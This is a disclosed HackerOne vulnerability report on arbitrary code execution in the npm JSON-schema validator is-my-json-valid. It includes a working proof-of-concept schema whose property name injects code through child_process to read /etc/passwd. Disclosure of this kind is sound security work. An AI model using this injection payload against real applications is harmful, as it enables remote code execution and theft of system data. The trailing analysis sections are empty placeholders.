---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '894308'
original_report_id: '894308'
title: Arbitrary code execution via untrusted schemas in is-my-json-valid
weakness: Code Injection
team_handle: nodejs-ecosystem
created_at: '2020-06-09T08:14:52.148Z'
disclosed_at: '2020-07-31T17:14:47.733Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- code-injection
---

# Arbitrary code execution via untrusted schemas in is-my-json-valid

## Metadata

- HackerOne Report ID: 894308
- Weakness: Code Injection
- Program: nodejs-ecosystem
- Disclosed At: 2020-07-31T17:14:47.733Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report an arbitrary code execution vulnerability in `is-my-json-valid`.
It allows to execute arbitrary code if an attacker-controlled schema is passed to `is-my-json-valid`.

The module Readme doesn't say anything about the risks of untrusted schemas, so I by default assume that this is applicable.
If it's not applicable, please place a warning in the readme that users should never use untrusted schemas.

# Module

**module name:** is-my-json-valod
**version:** 2.20.0
**npm page:** `https://www.npmjs.com/package/is-my-json-valid`

## Module Description

> A JSONSchema validator that uses code generation to be extremely fast.

## Module Stats

1 517 862 weekly downloads

# Vulnerability

## Vulnerability Description

See steps to reproduce.

The problem is in `formatName` function.

## Steps To Reproduce:

```js
const validator = require('is-my-json-valid')
const schema = {
  type: 'object',
  properties: {
    'x[console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`))]': {
      required: true,
      type:'string'
    }
  },
}
var validate = validator(schema);
validate({})
```

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Executing arbitrary js code and/or shell commands if the schema is attacker-controlled (e.g. user supplies JSON with a schema).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
